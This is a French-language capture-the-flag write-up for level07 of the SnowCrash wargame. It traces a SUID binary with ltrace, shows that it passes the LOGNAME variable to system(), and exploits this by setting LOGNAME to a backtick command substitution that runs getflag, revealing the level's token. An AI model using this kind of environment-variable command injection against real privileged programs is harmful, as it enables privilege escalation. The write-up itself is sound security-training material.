# level07

Le système de fichier se présente de cette manière:

``` bash
level07@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level07 level07  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
```

L'executable a le bit du SUID activé, on va donc pouvoir l'exécuter avec les droits de flag07.

L'execution du fichier renvoit systèmatiquement la chaine "level07".

``` bash
level07@SnowCrash:~$ ./level07
level07
level07@SnowCrash:~$ ./level07 d
level07
level07@SnowCrash:~$ ./level07 d d
level07
```

L'analyse du fichier via `ltrace` revèle l'utilisation de la fonction `getenv()` pour recuperer la variable d'environnement `LOGNAME`.
Il utilise `asprintf()` pour formater une commande : `/bin/echo [LOGNAME]` et passe cette chaine à `system()`


``` bash
level07@SnowCrash:~$ ltrace ./level07
__libc_start_main(0x8048514, 1, 0xbffff7f4, 0x80485b0, 0x8048620 <unfinished ...>
getegid()                                                                                = 2007
geteuid()                                                                                = 2007
setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                      = 0
setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                      = 0
getenv("LOGNAME")                                                                        = "level07"
asprintf(0xbffff744, 0x8048688, 0xbfffff46, 0xb7e5ee55, 0xb7fed280)                      = 18
system("/bin/echo level07 "level07
 <unfinished ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                   = 0
+++ exited (status 0) +++
```
En redefinisaant `LOGNAME` avec une substitution de commande (backticks) on force le sous-shell invoqué par `system()` à exécuter `getflag` au lieu de simplement afficher le contenu du texte.
L'utilisation des guillemets simples dans l'export de la variable est indispenable pour eviter que notre shell actuel n'execute pas getflag avant meme que l'on lance le programme.

``` bash
level07@SnowCrash:~$ export LOGNAME='`getflag`'
level07@SnowCrash:~$ ./level07 
Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
```
